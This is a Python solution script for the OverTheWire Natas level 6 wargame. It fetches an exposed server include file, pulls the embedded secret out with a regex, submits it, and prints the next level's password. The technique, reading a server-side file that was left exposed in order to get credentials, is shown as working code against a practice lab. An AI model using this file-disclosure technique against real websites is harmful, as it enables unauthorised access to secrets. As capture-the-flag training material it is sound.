import requests
import time
import sys
import re

url = "http://natas6.natas.labs.overthewire.org/"
auth = ("natas6", "secret")

pass_code = ""

print("[*]Connecting. . .")

session = requests.Session()
session.auth = auth

print("[. . . ] Moving to directory")

res_get = session.get(url=url + "includes/secret.inc", auth=auth)

if res_get.status_code == 200:
    print("[*]Searching the secret password. . .")
else:
    print(f"[-]Error to connect. Error: {res_get.status_code}")
    sys.exit()

flag = re.search(r'\$secret = "([A-Z]{19})"', res_get.text, re.IGNORECASE)
if flag:
    print("[+]Pass-code is founded!")
    pass_code += flag.group(1)
else:
    sys.exit("[-]Error to find the Pass-code in GET request")
    

print("[*]Using this key in main website. . .")

data = {
    "secret": pass_code,
    "submit": "Submit"
}    

res_post = session.post(url=url, data=data, timeout=5)

print("[+]Congratulations! Your Password is here:")
flag2 = re.search(r"for natas7 is[:\s]*([A-Za-z0-9]{32})", res_post.text)
time.sleep(2.0)
print(flag2.group(1))